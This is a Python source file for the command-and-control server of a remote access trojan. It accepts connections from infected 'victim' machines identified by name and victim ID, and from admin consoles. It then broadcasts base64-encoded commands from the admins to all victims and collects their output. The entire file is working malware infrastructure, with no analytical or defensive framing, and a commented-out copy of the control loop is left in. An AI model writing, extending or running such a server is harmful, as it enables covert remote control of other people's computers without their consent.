import base64
import socket
import time
from threading import Thread
from colorama import Fore

PORT = 55555
IP = "0.0.0.0"
FULLADDRESS = (IP, PORT)

HEADER = 1000000

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(FULLADDRESS)

ratclients = []
controlclients = []

def connectionhandler():
    print(f"{Fore.YELLOW}[i] Listening on {FULLADDRESS}{Fore.RESET}")
    while True:
        server.listen()
        connection, address = server.accept()
        fullclientinfo = connection.recv(HEADER).decode()
        print(fullclientinfo)
        if "@adminconsole" in fullclientinfo:
            controlclients.append([fullclientinfo, connection])
            # Thread(target=controlclient,args=[connection,fullclientinfo]).start()
        else:
            name = fullclientinfo.split("%")[0]
            victimid = fullclientinfo.split("%")[1]
            print(f"{Fore.YELLOW}[i] {name} ID: {victimid} HAS CONNECTED{Fore.RESET}")
            ratclients.append([[victimid, name], connection])


def send(message, client):
    chunks = [message[i:i + HEADER] for i in range(0, len(message), HEADER)]
    client.send(str(len(chunks)).encode())
    for messag in chunks:
        client.send(messag)


# def controlclient(conn,clientinfo): 
#     while True:
#         try:
#             print(f"{Fore.YELLOW}\n[i] Waiting for command from {clientinfo}...{Fore.RESET}")
#             chunks = conn.recv(HEADER).decode()
#             recvout = "".join(conn.recv(HEADER).decode() for _ in range(int(chunks)))
#             command = base64.b64decode(recvout).decode()
#             print(f"{Fore.YELLOW}[i] Recieved command from {clientinfo}: {Fore.RESET}{command}")
#             outputlist = []
#             if command == "list":
#                 longestid = 5
#                 longestname = 20
#                 if len(ratclients) > 0:
#                     longestid = len(max(ratclients, key=lambda x: len(x[0][0]))[0][0])
#                     longestname = len(max(ratclients, key=lambda x: len(x[0][1]))[0][1])
#                 infolist = "ID" + " " * (longestid - 2) + "│ NAME" + " " * (longestname - 4) + "\n"
#                 infolist += "─" * longestid + "┼" + "─" * longestname + "\n"
#                 for info in ratclients:
#                     infolist += info[0][0] + " " * (longestid - len(info[0][0])) + "│" + info[0][1] + "\n"
#                 outputlist.append(base64.b64encode(infolist.encode(errors="ignore")))
#             else:
#                 for ratclient in ratclients:
#                     try:
#                         ratconn = ratclient[1]
#                         send(base64.b64encode(command.encode(errors="ignore")), ratconn)
#                         chunks = ratconn.recv(HEADER).decode()
#                         chunksout = "".join(ratconn.recv(HEADER).decode() for _ in range(int(chunks)))
#                         outputlist.append(chunksout)
#                     except ConnectionResetError:
#                         ratclients.remove(ratclient)

#                 if not outputlist:
#                     outputlist.append(base64.b64encode(
#                         f"{Fore.RED}[SERVER] [!] No clients are online or the command had an error{Fore.RESET}".encode(
#                             errors="ignore")))
#             send(str(outputlist).encode(), conn)
#         except ConnectionAbortedError:
#             controlclients.remove(conn)


if __name__ == "__main__":
    def main():  # sourcery skip: low-code-quality
        thr = Thread(target=connectionhandler)
        thr.start()
        while True:
            for fullconn in controlclients:
                try:
                    conn = fullconn[1]
                    clientinfo = fullconn[0]
                    print(f"{Fore.YELLOW}\n[i] Waiting for command from {clientinfo}...{Fore.RESET}")
                    chunks = conn.recv(HEADER).decode()
                    recvout = "".join(conn.recv(HEADER).decode() for _ in range(int(chunks)))
                    command = base64.b64decode(recvout).decode()
                    print(f"{Fore.YELLOW}[i] Recieved command from {clientinfo}: {Fore.RESET}{command}")
                    outputlist = []
                    if command == "list":
                        longestid = 5
                        longestname = 20
                        if len(ratclients) > 0:
                            longestid = len(max(ratclients, key=lambda x: len(x[0][0]))[0][0])
                            longestname = len(max(ratclients, key=lambda x: len(x[0][1]))[0][1])
                        infolist = "ID" + " " * (longestid - 2) + "│ NAME" + " " * (longestname - 4) + "\n"
                        infolist += "─" * longestid + "┼" + "─" * longestname + "\n"
                        for info in ratclients:
                            infolist += info[0][0] + " " * (longestid - len(info[0][0])) + "│" + info[0][1] + "\n"
                        outputlist.append(base64.b64encode(infolist.encode(errors="ignore")))
                    else:
                        for ratclient in ratclients:
                            try:
                                ratconn = ratclient[1]
                                send(base64.b64encode(command.encode(errors="ignore")), ratconn)
                                chunks = ratconn.recv(HEADER).decode()
                                chunksout = "".join(ratconn.recv(HEADER).decode() for _ in range(int(chunks)))
                                outputlist.append(chunksout)
                            except ConnectionResetError:
                                ratclients.remove(ratclient)

                        if not outputlist:
                            outputlist.append(base64.b64encode(
                                f"{Fore.RED}[SERVER] [!] No clients are online or the command had an error{Fore.RESET}".encode(
                                    errors="ignore")))
                    send(str(outputlist).encode(), conn)
                except ConnectionAbortedError:
                    controlclients.remove(fullconn)

    Thread(target=main).start()
